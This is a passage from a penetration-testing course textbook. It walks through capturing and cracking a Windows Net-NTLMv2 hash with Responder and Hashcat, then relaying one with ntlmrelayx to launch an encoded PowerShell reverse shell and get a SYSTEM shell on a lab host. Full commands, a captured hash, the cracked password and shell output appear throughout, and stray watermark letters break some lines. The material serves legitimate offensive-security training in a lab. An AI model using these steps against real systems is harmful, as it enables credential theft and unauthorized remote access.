when we discover a file upload form in a web application on a Windows server, we can try to enter
a non-existing file with a UNC path like \\192.168.119.2\share\nonexistent.txt. If the web
application supports uploads via SMB, the Windows server will authenticate to our SMB server.
Let’s capture and crack a Net-NTLMv2 hash. We’ll set up Responder on our Kali machine as an
SMB server and use FILES01 (at 192.168.50.211) as the target. Let’s assume we used an attack
vector to execute a bind shell on the target system. We’ll connect to port 4444 with Netcat where
669 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Kerberos_(protocol)
670 (Github, 2022), https://github.com/lgandx/Responder
671 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution
672 (Wikipedia, 2022), https://en.wikipedia.org/wiki/NetBIOS
673 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Multicast_DNS
674 (MITRE ATT&CK, 2021), https://attack.mitre.org/techniques/T1557/001/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 420
Made in Morocco
Penetration Testing with Kali Linux
our bind shell is running. After we successfully connect, we’ll use whoami to check which user is
running the bind shell. We’ll then use the net user command to check if the user is a member of
the local Administrators group.
kali@kali:~$ nc 192.168.50.211 4444
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
whoami
files01\paul
C:\Windows\system32> net user paul
net user paul
User name paul
Full Name paul power y
Comment
User's comment
k
Country/region code 000 (System Default)
Account active Yes
Account expires Never s
Password last set 6/3/2022 10:05:27 AM
Password expires Never o
Password changeable 6/3/2022 10:05:27 AM
Password required Yes
n
User may change password Yes
Workstations allowed All
i
Logon script
z
User profile
Home directory
Last logon 6/3/2022 10:29:19 AM
D
Logon hours allowed All
Local Group Memberships *Remote Desktop Users *Users
Global Group memberships *None
The command completed successfully.
Listing 300 - Connect to the bind shell on port 4444
The output shows the bind shell runs as the user paul, which is not a local administrator on the
FILES01 system. Interestingly, the paul user is a member of the Remote Desktop Users group,
which allows the user to connect to the system with RDP.
For the sake of this demonstration, let’s assume the user gunther (which we used in the previous
section) does not exist or we don’t have access to the account. In this case, we only have access
to paul on this system.
Since we don’t have privileges to run Mimikatz, we cannot extract passwords from the system.
But we can set up an SMB server with Responder on our Kali machine, then connect to it with the
user paul and crack the Net-NTLMv2 hash, which is used in the authentication process.
Let’s do this now. First, we’ll need to run ip a to retrieve a list of all interfaces. Then, we’ll run
responder (which is already pre-installed on Kali) as sudo to enable permissions needed to handle
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 421
Made in Morocco
Penetration Testing with Kali Linux
privileged raw socket operations for the various protocols. We’ll set the listening interface with -I,
noting that your interface name may differ from what’s shown here.
kali@kali:~$ ip a
...
3: tap0:  mtu 1500 qdisc fq_codel state UNKNOWN group
default qlen 1000
link/ether 42:11:48:1b:55:18 brd ff:ff:ff:ff:ff:ff
inet 192.168.119.2/24 scope global tap0
valid_lft forever preferred_lft forever
inet6 fe80::4011:48ff:fe1b:5518/64 scope link
valid_lft forever preferred_lft forever
kali@kali:~$ sudo responder -I tap0
__
.----.-----.-----.-----.-----.-----.--| |.-----.----. y
| _| -__|__ --| _ | _ | | _ || -__| _|
|__| |_____|_____| __|_____|__|__|_____||_____|__|
k
|__|
NBT-NS, LLMNR & MDNS Responder 3.1.1.0
s
Author: Laurent Gaffie (PI:EMAIL)
To kill this script hit CTRL-C o
...
HTTP server [ON]
HTTPS server [ON] n
WPAD proxy [OFF]
Auth proxy [OFF]
i
SMB server [ON]
... z
[+] Listening for events...
Listing 301 - Starting Responder on interface tap0
D
The output shows that Responder is now listening for events and the SMB server is active.
Our next step is to request access to a non-existent SMB share on our Responder SMB server
using paul’s bind shell. We’ll do this with a simple dir listing of \\192.168.119.2\test, in which “test”
is an arbitrary directory name. We are only interested in the authentication process, not a share
listing.
Let’s switch back to the terminal tab containing our Netcat bind shell connection and enter the
command.
C:\Windows\system32>dir \\192.168.119.2\test
dir \\192.168.119.2\test
Access is denied.
Listing 302 - Using the dir command to create an SMB connection to our Kali machine
The Responder tab should show the following:
...
[+] Listening for events...
[SMB] NTLMv2-SSP Client : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash :
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 422
Made in Morocco
Penetration Testing with Kali Linux
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050
CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D003400
44004E004800550058004300340054004900430004003400570049004E002D00340044004E004800550058
00430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D00
52002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000
B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70
090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000
000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000
000000000000
Listing 303 - Responder capturing the Net-NTLMv2 Hash of paul
This indicates that Responder successfully captured paul’s Net-NTLMv2 hash. We’ll save this to
paul.hash so we can crack it with Hashcat. Before we start cracking, let’s retrieve the correct
mode.
kali@kali:~$ cat paul.hash y
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050
CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D003400
k
44004E00480055005800430034005400490043000400340057...
kali@kali:~$ hashcat --help | grep -i "ntlm"
s
5500 | NetNTLMv1 / NetNTLMv1+ESS | Network Protocol
27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) | Network Protocol
5600 | NetNTLMv2 o | Network Protocol
27100 | NetNTLMv2 (NT) | Network Protocol
1000 | NTLM | Operating System
n
Listing 304 - Contents of paul.hash and Hashcat mode
This file contains paul’s captured Net-NTLMv2 hash (which is cropped in this Listing) and
i
according to Hashcat, it is mode 5600 (“NetNTLMv2”).
z
Now let’s attempt to crack the hash using the rockyou.txt wordlist.
D
kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...
PAUL::FILES01:1f9d4c51f6e74653:795f138ec69c274d0fd53bb32908a72b:010100000000000000b050
cd1777d801b7585df5719acfba0000000002000800360057004d00520001001e00570049004e002d003400
44004e004800550058004300340054004900430004003400570049004e002d00340044004e004800550058
00430034005400490043002e00360057004d0052002e004c004f00430041004c0003001400360057004d00
52002e004c004f00430041004c0005001400360057004d0052002e004c004f00430041004c000700080000
b050cd1777d801060004000200000008003000300000000000000000000000002000008ba7af42bfd51d70
090007951b57cb2f5546f7b599bc577ccd13187cfc5ef4790a001000000000000000000000000000000000
000900240063006900660073002f003100390032002e003100360038002e003100310038002e0032000000
000000000000:123Password123
...
Listing 304 - Cracking the Net-NTLMv2 hash of paul
The listing shows that we successfully cracked paul’s Net-NTLMv2 hash. Let’s confirm that the
password is valid by connecting to FILES01 with RDP.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 423
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
Figure 221: RDP Connection as paul
Figure 221 shows that we successfully connectedo to FILES01 with RDP as paul.
In this section we generated authentication requests from Windows and obtained and cracked
Net-NTLMv2 hashes. In the next section, wen’ll leverage the hash in a different way.
13.3.4 Relaying Net-NTLMv2
i
z
In this section, we’ll have access to FILES01 as an unprivileged user (files02admin), which means
we cannot run Mimikatz to extract passwords. Using the steps from the previous section, imagine
we obtained the Net-NTLMvD2 hash, but couldn’t crack it because it was too complex.
What we can assume based on the username is that the user may be a local administrator on
FILES02. Therefore, we can try to use the hash on another machine in what is known as a relay
attack.675
In this attack, we’ll again use the dir command in the bind shell to create an SMB connection to
our Kali machine. Instead of merely printing the Net-NTLMv2 hash used in the authentication
step, we’ll forward it to FILES02. If files02admin is a local user of FILES02, the authentication is
valid and therefore accepted by the machine. If the relayed authentication is from a user with
local administrator privileges, we can use it to authenticate and then execute commands over
SMB with methods similar to those used by psexec or wmiexec.
In this example we don’t use the local Administrator user for the relay attack as
we did for the pass-the-hash attack. Therefore, the target system needs to have
UAC remote restrictions disabled or the command execution will fail. If UAC
675 (Microsoft Documentation, 2008), https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-068
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 424
Made in Morocco
Penetration Testing with Kali Linux
remote restrictions are enabled on the target then we can only use the local
Administrator user for the relay attack.
We’ll perform this attack with ntlmrelayx, another tool from the impacket library.676 This tool does
the heavy lifting for us by setting up an SMB server and relaying the authentication part of an
incoming SMB connection to a target of our choice.
Let’s get right into the attack by starting ntlmrelayx, which we can use with the pre-installed
impacket-ntlmrelayx package. We’ll use --no-http-server to disable the HTTP server since we are
relaying an SMB connection and -smb2support to add support for SMB2.677 We’ll also use -t to set
the target to FILES02. Finally, we’ll set our command with -c, which will be executed on the target
system as the relayed user. We’ll use a PowerShell reverse shell one-liner,678 which we’ll base64-
encode and execute with the -enc argument as we’ve done before in this course. We should note
y
that the base64-encoded PowerShell reverse shell one-liner is shortened in the following listing,
but it uses the IP of our Kali machine and port 8080 for the reverse shell to connect.
k
kali@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212
-c "powershell -enc JABjAGwAaQBlAG4AdA..."
s
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Protocol Client SMB loaded.. o
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded.. n
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server i
[*] Setting up WCF Server z
[*] Setting up RAW Server on port 6666
D
[*] Servers started, waiting for connections
Listing 305 - Starting ntlmrelayx for a Relay-attack targeting FILES02
Next, we’ll start a Netcat listener on port 8080 (in a new terminal tab) to catch the incoming
reverse shell.
kali@kali:~$ nc -nvlp 8080
listening on [any] 8080 ...
Listing 306 - Starting a Netcat listener on port 8080
Now we’ll run Netcat in another terminal to connect to the bind shell on FILES01 (port 5555). After
we connect, we’ll enter dir \\192.168.119.2\test to create an SMB connection to our Kali machine.
Again, the remote folder name is arbitrary.
kali@kali:~$ nc 192.168.50.211 5555
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.
676 (Github, 2022), https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
677 (Wireshark Wiki, 2020), https://wiki.wireshark.org/SMB2
678 (Github, 2020), https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 425
Made in Morocco
Penetration Testing with Kali Linux
C:\Windows\system32>whoami
whoami
files01\files02admin
C:\Windows\system32>dir \\192.168.119.2\test
...
Listing 307 - Using the dir command to create an SMB connection to our Kali machine
We should receive an incoming connection in our ntlmrelayx tab.
[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target
smb://192.168.50.212
[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more
targets left!
...
y
[*] Executed specified command on host: 192.168.50.212
Listing 308 - Relay-attack to execute the reverse shell on FILES02
k
The output indicates that ntlmrelayx received an SMB connection and used it to authenticate to
our target by relaying it. After successfully authenticating, our command was executed on the
s
target.
Our Netcat listener should have caught the reverseo shell.
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
whoami n
nt authority\system
PS C:\Windows\system32> hostnamei
FILES02 z
PS C:\Windows\system32> ipconfig
D
Windows IP Configuration
Ethernet adapter Ethernet0:
Connection-specific DNS Suffix . :
Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
IPv4 Address. . . . . . . . . . . : 192.168.50.212
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.50.254
Listing 309 - Incoming reverse shell
Listing 309 shows that we could leverage a relay attack to get code execution on FILES02.
In this section, we demonstrated that we can leverage our ability to start an SMB connection to
either crack or relay the Net-NTLMv2 hash. However, UAC remote restrictions limit the users we
can use in pass-the-hash or relay attacks outside of an Active Directory environment.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 426
Made in Morocco
Penetration Testing with Kali Linux
13.4 Wrapping Up
As penetration testers, we must familiarize ourselves with a variety of password attacks. We can
leverage these attacks in an external assessment to breach a perimeter via exposed network
services. We can also leverage them in internal penetration tests to retrieve plaintext passwords
or use hashes to access other systems. These are important skills for the Active Directory